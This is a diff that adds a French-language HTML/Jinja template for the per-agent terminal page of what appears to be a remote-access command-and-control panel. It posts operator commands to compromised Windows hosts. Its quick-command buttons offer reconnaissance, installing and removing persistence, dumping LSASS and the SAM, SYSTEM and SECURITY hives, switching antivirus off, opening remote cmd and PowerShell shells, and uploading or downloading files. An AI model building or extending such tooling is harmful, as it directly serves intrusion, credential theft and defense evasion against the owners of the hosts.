@@ -1,0 +1,637 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Terminal - {{ agent_id }}</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background: #1a1a2e;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container { max-width: 1200px; margin: 0 auto; }
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .agent-info { display: flex; align-items: center; gap: 15px; }
+
+        .agent-badge {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white;
+            padding: 10px 20px;
+            border-radius: 8px;
+            font-weight: bold;
+            font-size: 1.1em;
+        }
+
+        .status-dot {
+            width: 12px;
+            height: 12px;
+            background: #00ff88;
+            border-radius: 50%;
+            animation: pulse 2s infinite;
+            box-shadow: 0 0 10px #00ff88;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        .back-btn {
+            background: #2d2d44;
+            color: #aaa;
+            padding: 10px 20px;
+            border-radius: 8px;
+            text-decoration: none;
+            transition: all 0.3s;
+        }
+
+        .back-btn:hover { background: #3d3d54; color: white; }
+
+        .cmd-panel {
+            background: #252536;
+            border-radius: 12px;
+            padding: 15px;
+            margin-bottom: 15px;
+        }
+
+        .cmd-panel-title {
+            color: #888;
+            font-size: 11px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 12px;
+            padding-bottom: 8px;
+            border-bottom: 1px solid #3a3a4d;
+        }
+
+        .cmd-categories {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .cmd-category {
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+
+        .cmd-cat-label {
+            color: #667eea;
+            font-size: 11px;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            min-width: 90px;
+            padding-top: 5px;
+            flex-shrink: 0;
+        }
+
+        .cmd-buttons {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 6px;
+        }
+
+        .quick-cmd {
+            background: #3a3a4d;
+            color: #ccc;
+            padding: 5px 10px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 12px;
+            font-family: monospace;
+            transition: all 0.2s;
+            border: 1px solid transparent;
+            user-select: none;
+        }
+
+        .quick-cmd:hover { background: #4a4a5d; color: white; border-color: #667eea; }
+
+        .quick-cmd.danger {
+            background: #3a1a1a;
+            color: #ff7070;
+            border-color: #f4433620;
+        }
+
+        .quick-cmd.danger:hover { background: #4a2020; border-color: #f44336; color: #ff5555; }
+
+        .quick-cmd.warn {
+            background: #2a2a1a;
+            color: #f9d423;
+            border-color: #f9d42320;
+        }
+
+        .quick-cmd.warn:hover { background: #3a3a20; border-color: #f9d423; }
+
+        .main-layout {
+            display: grid;
+            grid-template-columns: 1fr 280px;
+            gap: 20px;
+        }
+
+        .terminal-window {
+            background: #0c0c0c;
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
+        }
+
+        .terminal-titlebar {
+            background: #2d2d2d;
+            padding: 10px 15px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .terminal-buttons { display: flex; gap: 8px; }
+
+        .terminal-btn { width: 14px; height: 14px; border-radius: 50%; }
+        .btn-close    { background: #ff5f57; }
+        .btn-minimize { background: #ffbd2e; }
+        .btn-maximize { background: #28ca41; }
+
+        .terminal-title { color: #808080; font-size: 13px; font-family: monospace; }
+
+        .terminal-tabs { display: flex; gap: 5px; }
+
+        .terminal-tab {
+            background: #1e1e2e;
+            color: #808080;
+            padding: 5px 15px;
+            border-radius: 6px 6px 0 0;
+            font-size: 12px;
+        }
+
+        .terminal-tab.active { background: #0c0c0c; color: white; }
+
+        /* Terminal body */
+        .terminal-body {
+            height: 500px;
+            overflow-y: auto;
+            cursor: text;
+        }
+
+        .terminal-body::-webkit-scrollbar { width: 10px; }
+        .terminal-body::-webkit-scrollbar-track { background: #1e1e1e; }
+        .terminal-body::-webkit-scrollbar-thumb { background: #4a4a4a; border-radius: 5px; }
+        .terminal-body::-webkit-scrollbar-thumb:hover { background: #5a5a5a; }
+
+        .terminal-content {
+            padding: 15px;
+            font-family: 'Cascadia Code', 'Consolas', 'Courier New', monospace;
+            font-size: 14px;
+            line-height: 1.6;
+        }
+
+        /* ── Lignes terminal ── */
+        .t-line {
+            white-space: nowrap;
+            overflow: hidden;
+            margin-top: 4px;
+        }
+
+        .t-line:first-child { margin-top: 0; }
+
+        .t-prompt { color: #6cf; }
+        .t-cmd    { color: #ffeb3b; }
+        .t-input  { color: #ffeb3b; }
+
+        .t-output {
+            color: #b5b5b5;
+            white-space: pre-wrap;
+            word-break: break-word;
+            margin-top: 2px;
+            margin-bottom: 10px;
+        }
+
+        .t-output.error { color: #f44336; }
+        .t-output.wait  { color: #555; }
+
+        .t-cursor {
+            display: inline-block;
+            width: 8px;
+            height: 14px;
+            background: #b5b5b5;
+            animation: blink 1s step-end infinite;
+            vertical-align: text-bottom;
+            margin-left: 1px;
+        }
+
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50%       { opacity: 0; }
+        }
+
+        /* Input caché */
+        #hidden-input {
+            position: fixed;
+            left: -9999px;
+            top: -9999px;
+            width: 0;
+            height: 0;
+            opacity: 0;
+            border: none;
+            outline: none;
+        }
+
+        /* Historique */
+        .history-panel {
+            background: #252536;
+            border-radius: 12px;
+            padding: 15px;
+            height: fit-content;
+            max-height: 600px;
+            overflow-y: auto;
+        }
+
+        .history-title {
+            color: #888;
+            font-size: 12px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 15px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid #3a3a4d;
+        }
+
+        .history-item {
+            background: #1e1e2e;
+            padding: 10px 12px;
+            border-radius: 6px;
+            margin-bottom: 8px;
+            cursor: pointer;
+            transition: all 0.2s;
+            border-left: 3px solid transparent;
+        }
+
+        .history-item:hover { background: #2a2a3e; border-left-color: #667eea; }
+
+        .history-cmd {
+            color: #ffeb3b;
+            font-family: monospace;
+            font-size: 12px;
+            margin-bottom: 4px;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .history-time { color: #666; font-size: 10px; }
+
+        .history-output {
+            color: #666;
+            font-size: 11px;
+            font-family: monospace;
+            margin-top: 5px;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        @media (max-width: 900px) {
+            .main-layout { grid-template-columns: 1fr; }
+            .history-panel { display: none; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="agent-info">
+                <div class="status-dot"></div>
+                <div class="agent-badge">{{ agent_id }}</div>
+            </div>
+            <a href="/" class="back-btn">Retour</a>
+        </div>
+
+        <div class="cmd-panel">
+            <div class="cmd-panel-title">Commandes rapides</div>
+            <div class="cmd-categories">
+
+                <div class="cmd-category">
+                    <span class="cmd-cat-label">Info</span>
+                    <div class="cmd-buttons">
+                        <span class="quick-cmd" onclick="setCmd('whoami')">whoami</span>
+                        <span class="quick-cmd" onclick="setCmd('hostname')">hostname</span>
+                        <span class="quick-cmd" onclick="setCmd('systeminfo')">systeminfo</span>
+                        <span class="quick-cmd" onclick="setCmd('ipconfig /all')">ipconfig /all</span>
+                        <span class="quick-cmd" onclick="setCmd('net user')">net user</span>
+                        <span class="quick-cmd" onclick="setCmd('net localgroup administrators')">net localgroup administrators</span>
+                        <span class="quick-cmd" onclick="setCmd('set')">set</span>
+                        <span class="quick-cmd" onclick="setCmd('check-admin')">check-admin</span>
+                    </div>
+                </div>
+
+                <div class="cmd-category">
+                    <span class="cmd-cat-label">Fichiers</span>
+                    <div class="cmd-buttons">
+                        <span class="quick-cmd" onclick="setCmd('dir')">dir</span>
+                        <span class="quick-cmd" onclick="setCmd('dir /a')">dir /a</span>
+                        <span class="quick-cmd" onclick="setCmd('tree')">tree</span>
+                        <span class="quick-cmd" onclick="setCmd('type ')">type</span>
+                        <span class="quick-cmd" onclick="setCmd('cd ..')">cd ..</span>
+                    </div>
+                </div>
+
+                <div class="cmd-category">
+                    <span class="cmd-cat-label">Processus</span>
+                    <div class="cmd-buttons">
+                        <span class="quick-cmd" onclick="setCmd('tasklist')">tasklist</span>
+                        <span class="quick-cmd" onclick="setCmd('tasklist /v')">tasklist /v</span>
+                        <span class="quick-cmd" onclick="setCmd('taskkill /IM  /F')">taskkill /IM</span>
+                    </div>
+                </div>
+
+                <div class="cmd-category">
+                    <span class="cmd-cat-label">Réseau</span>
+                    <div class="cmd-buttons">
+                        <span class="quick-cmd" onclick="setCmd('netstat -ano')">netstat -ano</span>
+                        <span class="quick-cmd" onclick="setCmd('netstat -ano | findstr LISTENING')">ports en écoute</span>
+                        <span class="quick-cmd" onclick="setCmd('arp -a')">arp -a</span>
+                        <span class="quick-cmd" onclick="setCmd('route print')">route print</span>
+                    </div>
+                </div>
+
+                <div class="cmd-category">
+                    <span class="cmd-cat-label">Persistance</span>
+                    <div class="cmd-buttons">
+                        <span class="quick-cmd" onclick="setCmd('check-persist')">check-persist</span>
+                        <span class="quick-cmd" onclick="setCmd('persistence -n &quot;&quot; -p &quot;&quot;')">persistence</span>
+                        <span class="quick-cmd" onclick="setCmd('unpersist -n &quot;&quot;')">unpersist</span>
+                    </div>
+                </div>
+
+                <div class="cmd-category">
+                    <span class="cmd-cat-label">Credentials</span>
+                    <div class="cmd-buttons">
+                        <span class="quick-cmd warn" onclick="setCmd('lsass')">lsass</span>
+                        <span class="quick-cmd warn" onclick="setCmd('sam')">sam</span>
+                        <span class="quick-cmd warn" onclick="setCmd('system')">system</span>
+                        <span class="quick-cmd warn" onclick="setCmd('security')">security</span>
+                    </div>
+                </div>
+
+                <div class="cmd-category">
+                    <span class="cmd-cat-label">Antivirus</span>
+                    <div class="cmd-buttons">
+                        <span class="quick-cmd" onclick="setCmd('av-status')">av-status</span>
+                        <span class="quick-cmd warn" onclick="setCmd('av-off')">av-off</span>
+                        <span class="quick-cmd" onclick="setCmd('av-on')">av-on</span>
+                    </div>
+                </div>
+
+                <div class="cmd-category">
+                    <span class="cmd-cat-label">Shell</span>
+                    <div class="cmd-buttons">
+                        <span class="quick-cmd" onclick="setCmd('shell cmd.exe')">shell cmd.exe</span>
+                        <span class="quick-cmd" onclick="setCmd('shell powershell.exe')">shell powershell.exe</span>
+                        <span class="quick-cmd" onclick="setCmd('upload ')">upload</span>
+                        <span class="quick-cmd" onclick="setCmd('download  ')">download</span>
+                    </div>
+                </div>
+
+                <div class="cmd-category">
+                    <span class="cmd-cat-label">Contrôle</span>
+                    <div class="cmd-buttons">
+                        <span class="quick-cmd" onclick="setCmd('help')">help</span>
+                        <span class="quick-cmd danger" onclick="setCmd('quit')">quit</span>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+
+        <div class="main-layout">
+            <div class="terminal-window">
+                <div class="terminal-titlebar">
+                    <div class="terminal-buttons">
+                        <div class="terminal-btn btn-close"></div>
+                        <div class="terminal-btn btn-minimize"></div>
+                        <div class="terminal-btn btn-maximize"></div>
+                    </div>
+                    <div class="terminal-title" id="terminal-title">{{ current_dir }}</div>
+                    <div class="terminal-tabs">
+                        <div class="terminal-tab active"><span>cmd</span></div>
+                    </div>
+                </div>
+
+                <div class="terminal-body" id="terminal">
+                    <div class="terminal-content" id="content">
+{%- for item in history %}
+<div class="t-line"><span class="t-prompt">{{ item.cwd }}&gt; </span><span class="t-cmd">{{ item.command }}</span></div><div class="t-output">{{ item.output }}</div>
+{%- endfor %}
+                    </div>
+                </div>
+            </div>
+
+            <div class="history-panel" id="history-panel">
+                <div class="history-title">Historique</div>
+                {% if history %}
+                    {% for item in history|reverse %}
+                    <div class="history-item" onclick="setCmd('{{ item.command|e }}')">
+                        <div class="history-cmd">{{ item.command }}</div>
+                        <div class="history-time">{{ item.time }}</div>
+                        <div class="history-output">{{ item.output[:50] }}{% if item.output|length > 50 %}...{% endif %}</div>
+                    </div>
+                    {% endfor %}
+                {% else %}
+                    <div style="color:#555;text-align:center;padding:20px;">Aucune commande</div>
+                {% endif %}
+            </div>
+        </div>
+    </div>
+
+    <!-- Input caché : capte la saisie sans être visible -->
+    <input type="text" id="hidden-input"
+           autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false">
+
+    <script>
+        const AGENT_ID = '{{ agent_id }}';
+        const terminal = document.getElementById('terminal');
+        const content  = document.getElementById('content');
+        const inp      = document.getElementById('hidden-input');
+
+        let currentDir   = {{ current_dir | tojson }};
+        let cmdHistory   = {{ history | map(attribute='command') | list | tojson }};
+        cmdHistory.reverse(); // plus récent en premier pour ArrowUp
+        let historyIndex = -1;
+
+        /* ── Échappement HTML ── */
+        function esc(s) {
+            const d = document.createElement('div');
+            d.textContent = s;
+            return d.innerHTML;
+        }
+
+        function scrollToBottom() {
+            terminal.scrollTop = terminal.scrollHeight;
+        }
+
+        /* ── Nouveau prompt ── */
+        function newPrompt() {
+            const line = document.createElement('div');
+            line.className = 't-line';
+            line.id = 'cur';
+            line.innerHTML =
+                `<span class="t-prompt">${esc(currentDir)}&gt; </span>` +
+                `<span class="t-input" id="cur-text"></span>` +
+                `<span class="t-cursor"></span>`;
+            content.appendChild(line);
+            inp.value = '';
+            scrollToBottom();
+        }
+
+        /* ── Miroir input → span visible ── */
+        function sync() {
+            const s = document.getElementById('cur-text');
+            if (s) s.textContent = inp.value;
+        }
+
+        inp.addEventListener('input', sync);
+
+        inp.addEventListener('keydown', async (e) => {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                const cmd = inp.value.trim();
+                if (!cmd) return;
+                /* Ouvrir la fenêtre shell persistant si besoin */
+                if (cmd.startsWith('shell ') && !cmd.startsWith('shell_')) {
+                    window.open(`/${AGENT_ID}/shell`, 'Shell Persistant',
+                        'width=1000,height=650,resizable=yes,scrollbars=yes');
+                }
+                await submitCommand(cmd);
+
+            } else if (e.key === 'ArrowUp') {
+                e.preventDefault();
+                if (historyIndex < cmdHistory.length - 1) {
+                    historyIndex++;
+                    inp.value = cmdHistory[historyIndex];
+                    sync();
+                }
+
+            } else if (e.key === 'ArrowDown') {
+                e.preventDefault();
+                if (historyIndex > 0) {
+                    historyIndex--;
+                    inp.value = cmdHistory[historyIndex];
+                } else {
+                    historyIndex = -1;
+                    inp.value = '';
+                }
+                sync();
+            }
+        });
+
+        /* ── Envoi de commande ── */
+        async function submitCommand(cmd) {
+            /* 1. Figer la ligne courante */
+            const line = document.getElementById('cur');
+            if (line) {
+                line.removeAttribute('id');
+                line.querySelector('.t-cursor')?.remove();
+                const s = line.querySelector('#cur-text');
+                if (s) { s.removeAttribute('id'); s.textContent = cmd; }
+            }
+            cmdHistory.unshift(cmd);
+            historyIndex = -1;
+
+            /* 2. Indicateur d'attente */
+            const wait = document.createElement('div');
+            wait.className = 't-output wait';
+            wait.textContent = '...';
+            content.appendChild(wait);
+            scrollToBottom();
+
+            try {
+                const fd = new FormData();
+                fd.append('command', cmd);
+                const resp = await fetch(`/${AGENT_ID}/execute`, {
+                    method: 'POST',
+                    headers: { 'X-Requested-With': 'XMLHttpRequest' },
+                    body: fd
+                });
+                const data = await resp.json();
+                wait.remove();
+
+                /* 3. Sortie */
+                const out = document.createElement('div');
+                out.className = 't-output';
+                out.textContent = data.output || '';
+                content.appendChild(out);
+
+                /* 4. Mise à jour du répertoire */
+                if (data.cwd) {
+                    currentDir = data.cwd;
+                    document.getElementById('terminal-title').textContent = currentDir;
+                }
+
+                /* 5. Panneau historique */
+                pushHistory(cmd, data.output || '');
+
+            } catch (err) {
+                wait.remove();
+                const e2 = document.createElement('div');
+                e2.className = 't-output error';
+                e2.textContent = 'Erreur de connexion';
+                content.appendChild(e2);
+            }
+
+            /* 6. Nouveau prompt */
+            newPrompt();
+            inp.focus();
+        }
+
+        /* ── Mise à jour panneau historique ── */
+        function pushHistory(cmd, output) {
+            const panel = document.getElementById('history-panel');
+            if (!panel) return;
+            const ph = panel.querySelector('div[style]');
+            if (ph) ph.remove();
+
+            const short = output.length > 50 ? output.slice(0, 50) + '...' : output;
+            const time  = new Date().toLocaleTimeString('fr-FR',
+                          { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+            const item  = document.createElement('div');
+            item.className = 'history-item';
+            item.onclick   = () => setCmd(cmd);
+            item.innerHTML =
+                `<div class="history-cmd">${esc(cmd)}</div>` +
+                `<div class="history-time">${time}</div>` +
+                `<div class="history-output">${esc(short)}</div>`;
+
+            panel.querySelector('.history-title').insertAdjacentElement('afterend', item);
+        }
+
+        /* ── Utilitaires ── */
+        function setCmd(cmd) {
+            inp.value = cmd;
+            sync();
+            inp.focus();
+            scrollToBottom();
+        }
+
+        terminal.addEventListener('click', () => { inp.focus(); scrollToBottom(); });
+
+        window.onload = function() {
+            newPrompt();
+            scrollToBottom();
+            inp.focus();
+        };
+    </script>
+</body>
+</html>
